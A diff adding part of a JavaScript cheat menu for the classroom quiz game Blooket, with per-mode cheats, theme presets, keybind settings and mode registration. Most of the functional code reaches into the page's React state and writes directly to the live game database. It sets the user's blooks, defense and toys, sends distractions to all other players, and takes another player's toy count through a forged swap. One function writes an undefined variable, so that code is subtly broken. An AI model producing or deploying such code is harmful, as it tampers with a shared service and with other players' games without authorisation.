+            ],
+            rush: [
+                {
+                    name: "Set Blooks",
+                    description: "Sets amount of blooks you or your team has",
+                    inputs: [{
+                        name: "Blooks",
+                        type: "number"
+                    }],
+                    run: function (numBlooks) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ numBlooks });
+                        stateNode.isTeam ? stateNode.props.liveGameController.setVal({
+                            path: `a/${stateNode.props.client.name}/bs`,
+                            val: numBlooks
+                        }) : stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}/bs`,
+                            val: numDefense
+                        });
+                    }
+                },
+                {
+                    name: "Set Defense",
+                    description: "Sets amount of defense you or your team has (Max 4)",
+                    inputs: [{
+                        name: "Defense (max 4)",
+                        type: "number",
+                        max: 4
+                    }],
+                    run: function (defense) {
+                        let numDefense = Math.min(defense, 4);
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ numDefense });
+                        stateNode.isTeam ? stateNode.props.liveGameController.setVal({
+                            path: `a/${stateNode.props.client.name}/d`,
+                            val: numDefense
+                        }) : stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}/d`,
+                            val: numDefense
+                        });
+                    }
+                }
+            ],
+            workshop: [
+                {
+                    name: "Remove Distractions",
+                    description: "Removes all enemy distractions",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ fog: !1, dusk: !1, wind: !1, plow: !1, blizzard: !1, force: !1, canada: !1, trees: [!1, !1, !1, !1, !1, !1, !1, !1, !1, !1] });
+                    }
+                },
+                {
+                    name: "Send Distraction",
+                    description: "Sends a distraction to everyone else playing",
+                    inputs: [{
+                        name: "Distraction",
+                        type: "options",
+                        options: Object.entries({ c: "Oh Canada", b: "Blizzard", f: "Fog Spell", d: "Dark & Dusk", w: "Howling Wind", g: "Gift Time!", t: "TREES", s: "Snow Plow", fr: "Use The Force" }).map(([value, name]) => ({ name, value }))
+                    }],
+                    run: function (val) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.safe = true;
+                        stateNode.props.liveGameController.setVal({ path: `c/${stateNode.props.client.name}/tat`, val });
+                    }
+                },
+                {
+                    name: "Set Toys",
+                    description: "Sets amount of toys",
+                    inputs: [{
+                        name: "Toys",
+                        type: "number"
+                    }],
+                    run: function (toys) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ toys });
+                        stateNode.props.liveGameController.setVal({
+                            path: "c/".concat(stateNode.props.client.name),
+                            val: {
+                                b: stateNode.props.client.blook,
+                                t: toys
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Set Toys Per Question",
+                    description: "Sets amount of toys per question",
+                    inputs: [{
+                        name: "Toys Per Question",
+                        type: "number"
+                    }],
+                    run: function (toysPerQ) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ toysPerQ });
+                    }
+                },
+                {
+                    name: "Swap Toys",
+                    description: "Swaps toys with someone",
+                    inputs: [{
+                        name: "Player",
+                        type: "options",
+                        options: () => {
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            return new Promise(res => stateNode.props.liveGameController._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
+                        }
+                    }],
+                    run: function (target) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
+                            if (players && Object.keys(players).map(x => x.toLowerCase()).includes(target.toLowerCase())) {
+                                let [player, { t: toys }] = Object.entries(players).find(([name]) => name.toLowerCase() == target.toLowerCase());
+                                stateNode.props.liveGameController.setVal({
+                                    path: "c/".concat(stateNode.props.client.name),
+                                    val: {
+                                        b: stateNode.props.client.blook,
+                                        t: toys,
+                                        tat: `${player}:swap:${stateNode.state.toys}`
+                                    }
+                                });
+                                stateNode.setState({ toys });
+                            }
+                        });
+                    }
+                }
+            ],
+            settings: [
+                {
+                    name: "Import Settings",
+                    description: "Import a custom theme",
+                    inputs: [
+                        {
+                            name: "JSON Data",
+                            type: "string"
+                        }
+                    ],
+                    run: function (theme) {
+                        try {
+                            JSON.parse(theme);
+                        } catch (e) {
+                            return alert("Invalid JSON provided");
+                        }
+                        theme = { backgroundColor: "rgb(11, 194, 207)", infoColor: "#9a49aa", cheatList: "#9a49aa", defaultButton: "#9a49aa", disabledButton: "#A02626", enabledButton: "#47A547", textColor: "white", inputColor: "#7a039d", contentBackground: "rgb(64, 17, 95)", ...JSON.parse(theme) }
+                        Settings.setItem("theme", theme);
+                        for (const prop in theme) variables.sheet.cssRules[0].style.setProperty(`--${prop}`, theme[prop]);
+                    }
+                },
+                {
+                    name: "Export Settings",
+                    description: "Export the current theme to JSON",
+                    run: async function () {
+                        await navigator.clipboard.writeText(JSON.stringify(Settings.data.theme, null, 4));
+                        prompt("Text copied to clipboard. (Paste below to test)");
+                    }
+                },
+                {
+                    name: "Defaults",
+                    description: "Changes all the settings to a preset",
+                    inputs: [
+                        {
+                            name: "Theme",
+                            type: "options",
+                            options: [
+                                {
+                                    name: "Default",
+                                    value: {
+                                        backgroundColor: "rgb(11, 194, 207)",
+                                        infoColor: "#9a49aa",
+                                        cheatList: "#9a49aa",
+                                        defaultButton: "#9a49aa",
+                                        disabledButton: "#A02626",
+                                        enabledButton: "#47A547",
+                                        textColor: "white",
+                                        inputColor: "#7a039d",
+                                        contentBackground: "rgb(64, 17, 95)"
+                                    }
+                                },
+                                {
+                                    name: "Blacket",
+                                    value: {
+                                        backgroundColor: "#4f4f4f",
+                                        infoColor: "#2f2f2f",
+                                        cheatList: "#2f2f2f",
+                                        defaultButton: "#4f4f4f",
+                                        disabledButton: "#eb6234",
+                                        enabledButton: "#00c20c",
+                                        textColor: "white",
+                                        inputColor: "#3f3f3f",
+                                        contentBackground: "#2f2f2f"
+                                    }
+                                },
+                                {
+                                    name: "Skool.lol",
+                                    value: {
+                                        backgroundColor: "linear-gradient(90deg, rgba(104,45,140,1) 220px, rgba(237,30,121,1) 100%)",
+                                        cheatList: "#1e2124",
+                                        infoColor: "#1e2124",
+                                        defaultButton: "#36393e",
+                                        inputColor: "#1e2124",
+                                        enabledButton: "#9c9a9a",
+                                        textColor: "white",
+                                        disabledButton: "#171717",
+                                        contentBackground: "#292929"
+                                    }
+                                },
+                                {
+                                    name: "Blue - Purple Background",
+                                    value: {
+                                        backgroundColor: "linear-gradient(162.5deg, rgba(0,183,255,1) 220px, rgba(128,0,255,1) 100%)"
+                                    }
+                                },
+                                {
+                                    name: "Saint Patricks Background",
+                                    value: {
+                                        backgroundColor: "rgb(9, 148, 65)"
+                                    }
+                                },
+                                {
+                                    name: "Halloween Background",
+                                    value: {
+                                        backgroundColor: "rgb(41, 41, 41)"
+                                    }
+                                },
+                                {
+                                    name: "Fall Background",
+                                    value: {
+                                        backgroundColor: "rgb(224, 159, 62)"
+                                    }
+                                },
+                                {
+                                    name: "Winter Background",
+                                    value: {
+                                        backgroundColor: "linear-gradient(rgb(49, 170, 224), rgb(187, 221, 255))"
+                                    }
+                                },
+                                {
+                                    name: "Crypto Hack",
+                                    value: {
+                                        backgroundColor: "radial-gradient(#11581e,#041607)",
+                                        infoColor: "#1a1a1a",
+                                        cheatList: "#1a1a1a",
+                                        defaultButton: "rgb(88 175 88)",
+                                        disabledButton: "#A02626",
+                                        enabledButton: "#0b601b",
+                                        textColor: "white",
+                                        inputColor: "rgb(0 0 0 / 25%)",
+                                        contentBackground: "#11581e"
+                                    }
+                                },
+                                {
+                                    name: "Fishing Frenzy",
+                                    value: {
+                                        backgroundColor: "linear-gradient(180deg,#9be2fe 0,#67d1fb)",
+                                        infoColor: "#c8591e",
+                                        cheatList: "#c8591e",
+                                        defaultButton: "#ff751a",
+                                        disabledButton: "#bf0e0e",
+                                        enabledButton: "#2fb62f",
+                                        textColor: "white",
+                                        inputColor: "rgb(0 0 0 / 25%)",
+                                        contentBackground: "radial-gradient(#02b0ea 40%, #1d86ea)"
+                                    }
+                                },
+                                {
+                                    name: "Deceptive Dinos",
+                                    value: {
+                                        backgroundColor: "radial-gradient(rgba(220, 184, 86, 0), rgba(220, 184, 86, 0.4)), url(\"https://ac.blooket.com/play/111cb7e0ee6607ac3d1a13d534c0e0f1.png\"), #ead49a",
+                                        infoColor: "#af8942",
+                                        cheatList: "#af8942",
+                                        defaultButton: "#af8942",
+                                        disabledButton: "#A02626",
+                                        enabledButton: "#47A547",
+                                        textColor: "white",
+                                        inputColor: "rgb(0 0 0 / 10%)",
+                                        contentBackground: "radial-gradient(rgba(1,104,162,.6),rgba(24,55,110,.5)),radial-gradient(#2783b4 1.5px,#18376e 0) center / 24px 24px"
+                                    }
+                                },
+                                {
+                                    name: "Blook Rush",
+                                    value: {
+                                        backgroundColor: "repeating-linear-gradient(45deg,white,white 8%,#e6e6e6 0,#e6e6e6 16%)",
+                                        defaultButton: "#36c",
+                                        inputColor: "rgb(0 0 0 / 25%)",
+                                        infoColor: "#36c",
+                                        cheatList: "#36c",
+                                        contentBackground: "#888",
+                                        textColor: "white",
+                                        disabledButton: "#A02626",
+                                        enabledButton: "#47A547"
+                                    }
+                                },
+                                {
+                                    name: "Factory",
+                                    value: {
+                                        defaultButton: "#1563bf",
+                                        infoColor: "#a5aabe",
+                                        cheatList: "#a5aabe",
+                                        contentBackground: "#2d313d",
+                                        backgroundColor: "#3a3a3a",
+                                        enabledButton: "rgb(75, 194, 46)",
+                                        disabledButton: "#9a49aa",
+                                        inputColor: "rgb(0 0 0 / 25%)",
+                                        textColor: "white"
+                                    }
+                                },
+                                {
+                                    name: "Cafe",
+                                    value: {
+                                        backgroundColor: "linear-gradient(90deg,rgba(200,0,0,.5) 50%,transparent 0) center / 50px 50px,linear-gradient(rgba(200,0,0,0.5) 50%,transparent 0) white center / 50px 50px",
+                                        defaultButton: "#0bc2cf",
+                                        inputColor: "rgb(0 0 0 / 25%)",
+                                        infoColor: "#ac7339",
+                                        cheatList: "#ac7339",
+                                        contentBackground: "rgb(64, 64, 64)",
+                                        textColor: "white",
+                                        disabledButton: "#A02626",
+                                        enabledButton: "#47A547"
+                                    }
+                                },
+                                {
+                                    name: "Tower of Doom",
+                                    value: {
+                                        backgroundColor: "rgb(41 41 41)",
+                                        disabledButton: "rgb(151, 15, 5)",
+                                        defaultButton: "#333",
+                                        inputColor: "rgb(0 0 0 / 25%)",
+                                        contentBackground: "#404040",
+                                        enabledButton: "#4bc22e",
+                                        textColor: "white",
+                                        infoColor: "#9a49aa",
+                                        cheatList: "#9a49aa"
+                                    }
+                                },
+                                {
+                                    name: "Monster Brawl",
+                                    value: {
+                                        defaultButton: "rgb(45, 51, 67)",
+                                        backgroundColor: "rgb(78, 95, 124)",
+                                        inputColor: "rgb(0 0 0 / 25%)",
+                                        contentBackground: "linear-gradient(0deg,#374154,#4f5b74)",
+                                        infoColor: "#374154",
+                                        cheatList: "#374154",
+                                        textColor: "white",
+                                        enabledButton: "#47A547",
+                                        disabledButton: "#A02626"
+                                    }
+                                },
+                                {
+                                    name: "Tower Defense 2",
+                                    value: {
+                                        backgroundColor: "url(https://media.blooket.com/image/upload/v1676164454/Media/defense/backgroundTd1-02.svg) center / cover",
+                                        cheatList: "#a33c22",
+                                        infoColor: "#a33c22",
+                                        defaultButton: "#40b1d8",
+                                        inputColor: "#3e8cbe",
+                                        contentBackground: "#293c82",
+                                        enabledButton: "#47A547",
+                                        disabledButton: "#A02626",
+                                        textColor: "white"
+                                    }
+                                },
+                            ]
+                        }
+                    ],
+                    run: function (theme) {
+                        Settings.setItem("theme", { ...Settings.data.theme, ...theme });
+                        for (const prop in theme) variables.sheet.cssRules[0].style.setProperty(`--${prop}`, theme[prop]);
+                    }
+                },
+                {
+                    name: "Scale",
+                    description: "Forces the GUI to scale from 25%-100%",
+                    inputs: [
+                        {
+                            type: "number",
+                            name: "Percent scale",
+                            min: 25,
+                            max: 100,
+                            value: (Settings.data.scale || 1) * 100
+                        }
+                    ],
+                    run: function (scale) {
+                        scale = Math.min(Math.max(scale, 25), 100);
+                        Settings.setItem("scale", scale / 100);
+                        guiWrapper.style.transform = `scale(${(scale / 100)})`;
+                    }
+                },
+                {
+                    name: "Hide Keybind",
+                    description: "Change the hide keybind (Click button after input to change)",
+                    inputs: [
+                        {
+                            type: "function",
+                            name: "Input",
+                            function: onchange => createKeybindListener(({ shift, ctrl, alt, key }) => onchange(`${[ctrl && "Ctrl", shift && "Shift", alt && "Alt", key && key.toUpperCase()].filter(Boolean).join(' + ')}`))
+                        }
+                    ],
+                    run: function (hide) {
+                        Settings.setItem("hide", hide);
+                        controls.update(Settings.data.hide || { ctrl: true, key: "e" }, Settings.data.close || { ctrl: true, key: "x" });
+                    }
+                },
+                {
+                    name: "Close Keybind",
+                    description: "Change the quick close keybind (Click button after input to change)",
+                    inputs: [
+                        {
+                            type: "function",
+                            name: "Input",
+                            function: onchange => createKeybindListener(({ shift, ctrl, alt, key }) => onchange(`${[ctrl && "Ctrl", shift && "Shift", alt && "Alt", key && key.toUpperCase()].filter(Boolean).join(' + ')}`))
+                        }
+                    ],
+                    run: function (close) {
+                        Settings.setItem("close", close);
+                        controls.update(Settings.data.hide || { ctrl: true, key: "e" }, Settings.data.close || { ctrl: true, key: "x" });
+                    }
+                },
+                {
+                    name: "Background Color",
+                    description: "Changes the background color of the GUI",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--backgroundColor", color);
+                        Settings.setItem("theme.backgroundColor", color);
+                    }
+                },
+                {
+                    name: "Category List Color",
+                    description: "Changes the categories list background color",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--cheatList", color);
+                        Settings.setItem("theme.cheatList", color);
+                    }
+                },
+                {
+                    name: "Info Color",
+                    description: "Changes the color of the information at the top of the GUI",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--infoColor", color);
+                        Settings.setItem("theme.infoColor", color);
+                    }
+                },
+                {
+                    name: "Button Color",
+                    description: "Changes the color of the cheats",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--defaultButton", color);
+                        Settings.setItem("theme.defaultButton", color);
+                    }
+                },
+                {
+                    name: "Enabled Toggle Color",
+                    description: "Changes the color of enabled toggle cheats",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        Settings.setItem("theme.enabledButton", color);
+                    }
+                },
+                {
+                    name: "Disabled Toggle Color",
+                    description: "Changes the color of disabled toggle cheats",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--disabledButton", color);
+                        Settings.setItem("theme.disabledButton", color);
+                    }
+                },
+                {
+                    name: "Text Color",
+                    description: "Changes the text color",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--textColor", color);
+                        Settings.setItem("theme.textColor", color);
+                    }
+                },
+                {
+                    name: "Input Color",
+                    description: "Changes the color of inputs, like the set gold number input",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--inputColor", color);
+                        Settings.setItem("theme.inputColor", color);
+                    }
+                },
+                {
+                    name: "Content Color",
+                    description: "Changes the background color of the cheats",
+                    inputs: [{
+                        type: "string",
+                        name: "Color"
+                    }],
+                    run: function (color) {
+                        variables.sheet.cssRules[0].style.setProperty("--contentBackground", color);
+                        Settings.setItem("theme.contentBackground", color);
+                    }
+                }
+            ]
+        };
+        
+        addMode("Global", "https://media.blooket.com/image/upload/v1661496291/Media/uiTest/Games_Played_2.svg", Cheats.global)();
+        addMode("<span style=\"font-size: 18px\">Pirate's Voyage</span>", "data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj48c3ZnIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCAzMDAgMzAwIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zOnNlcmlmPSJodHRwOi8vd3d3LnNlcmlmLmNvbS8iIHN0eWxlPSJmaWxsLXJ1bGU6ZXZlbm9kZDtjbGlwLXJ1bGU6ZXZlbm9kZDtzdHJva2UtbGluZWpvaW46cm91bmQ7c3Ryb2tlLW1pdGVybGltaXQ6MjsiPjxnIGlkPSJCb2F0Ij48cGF0aCBkPSJNMTcwLjQsNTYuMDU0Yy02OC43ODgsMTAuMTc0IC0xMTUuOTcxLDU2LjkzOCAtMTQ1LjQxMSwxMzMuNzVsMTUuNDY5LDcuNzM0YzMwLjk2MiwtMjguMTc1IDc0LjcwNSwtMzcuNzg3IDEzMi4zMjIsLTI3LjI1bDAsLTE3LjYxMWMtMjUuNjI5LC0yNy45NTIgLTI2Ljk2NiwtNTYuNzcyIDAuNzE0LC04Ni42MjhsLTMuMDk0LC05Ljk5NVoiIHN0eWxlPSJmaWxsOiNmNmUwYmQ7Ii8+PHBhdGggZD0iTTE5OS42NzMsNjAuODEzYzMyLjc4NCw0Mi45ODIgNjUuODIyLDkwLjg4NyA5Ny4zMzcsMTM5LjU4MWwtNi42NjMsMGMtMTIuMDg1LC0zMS4xMTEgLTU3Ljg4MiwtMzkuNjk0IC05MS42MjYsLTI3LjI1YzIyLjUxNCwtMzQuNTc5IDE3Ljc5NiwtNzIuNjczIDAuOTUyLC0xMTIuMzMxWiIgc3R5bGU9ImZpbGw6I2Y2ZTBiZDsiLz48cGF0aCBkPSJNNjkuNDQ4LDE5Ny41MzhjMCwwIC01OS43MDcsLTE1LjI0MyAtNjguMzk4LC0xNy40NjJjLTAuMDc2LC0wLjAxOSAtMC4xNTQsMC4wMiAtMC4xODQsMC4wOTJjLTAuMDMsMC4wNzIgLTAuMDAyLDAuMTU1IDAuMDY1LDAuMTk1YzkuNjgyLDUuNzc1IDkxLjY0Nyw1NC42NTggOTEuNjQ3LDU0LjY1OGwtMjMuMTMsLTM3LjQ4M1oiIHN0eWxlPSJmaWxsOiM4ZDZlNDE7Ii8+PHBhdGggZD0iTTE2NC40NSw0Ny45MDNjMCwtNS4zNTMgNC4zNDYsLTkuNjk4IDkuNjk4LC05LjY5OGwxOS4zOTcsLTBjNS4zNTIsLTAgOS42OTgsNC4zNDUgOS42OTgsOS42OThsLTAsMTU2Ljk1M2MtMCw1LjM1MyAtNC4zNDYsOS42OTggLTkuNjk4LDkuNjk4bC0xOS4zOTcsMGMtNS4zNTIsMCAtOS42OTgsLTQuMzQ1IC05LjY5OCwtOS42OThsMCwtMTU2Ljk1M1oiIHN0eWxlPSJmaWxsOiM3ZjY4NDU7Ii8+PHBhdGggZD0iTTI2My45OTMsMjU2LjEwM2MyMi4xNzEsLTE0LjcxIDM2LjAwNywtMzUuNTE1IDM2LjAwNywtNTguNTY1bC0yMzAuNTUyLDBjMCwyMy43MTMgMTQuNjQzLDQ1LjA1IDM3Ljk0LDU5LjgxOWM5Ljg3NSwtMy43MjkgMjAuMDQxLC0xMS4zMzQgMzAuNDYzLC0yMi4zMzZjMzIuODExLDM1LjQ1NSA2NC4wNjksMzUuOTQzIDkzLjcwOCwwYzYuODM4LDkuNjc3IDE3LjczNiwxNi42NDYgMzIuNDM0LDIxLjA4MloiIHN0eWxlPSJmaWxsOiNiNjkyNWY7Ii8+PC9nPjwvc3ZnPg==", Cheats.voyage);
+        addMode("Gold Quest", "https://media.blooket.com/image/upload/v1661496292/Media/uiTest/Gold.svg", Cheats.gold);
+        addMode("Cafe", "https://media.blooket.com/image/upload/v1655161189/Media/survivor/Pizza_lvl1.svg", Cheats.cafe);
+        addMode("Crypto Hack", "https://media.blooket.com/image/upload/v1661496293/Media/uiTest/CryptoIcon.svg", Cheats.crypto);
+        addMode("<span style=\"font-size: 17px\">Deceptive Dinos</span>", [`<img style="height: 30px; margin-left: 8px; margin-right: 12px" src="https://media.blooket.com/image/upload/v1655161325/Media/survivor/Dog.svg">`], Cheats.dinos);
+        addMode("<span style=\"font-size: 18px\">Tower Defense</span>", [`<img style="width: 30px; margin-right: 5px" src="https://media.blooket.com/image/upload/v1657235025/Media/survivor/Laser_Lvl1.svg">`], Cheats.defense);
+        addMode("<span style=\"font-size: 16px\">Tower Defense 2</span>", [`<img style="width: 30px; margin-right: 5px; rotate: 45deg" src="https://media.blooket.com/image/upload/v1593095354/Media/defense/missile.svg">`], Cheats.defense2);
+        addMode("Factory", "https://media.blooket.com/image/upload/v1661496293/Media/uiTest/Factory_Upgrades.svg", Cheats.factory);
+        addMode("<span style=\"font-size: 19px\">Fishing Frenzy</span>", "https://media.blooket.com/image/upload/v1661496295/Media/uiTest/Fish_Weight.svg", Cheats.fishing);
+        addMode("Flappy Blook", "https://media.blooket.com/image/upload/v1645222006/Blooks/yellowBird.svg", Cheats.flappy);
+        addMode("<span style=\"font-size: 17px\">Tower of Doom</span>", [`<img style="height: 30px; margin-left: 5px; margin-right: 10px" src="https://media.blooket.com/image/upload/v1657235023/Media/survivor/cards-05.svg">`], Cheats.doom);
+        addMode("<span style=\"font-size: 18px\">Crazy Kingdom</span>", "https://media.blooket.com/image/upload/v1655161323/Media/survivor/Jester_lvl1.svg", Cheats.kingdom);
+        addMode("Racing", "https://media.blooket.com/image/upload/v1661496295/Media/uiTest/Racing_Progress.svg", Cheats.racing);
+        addMode("Battle Royale", "https://media.blooket.com/image/upload/v1655936179/Media/br/VS_Lightning_Bolt_Bottom.svg", Cheats.royale);
+        addMode("Blook Rush", "data:image/png;base64,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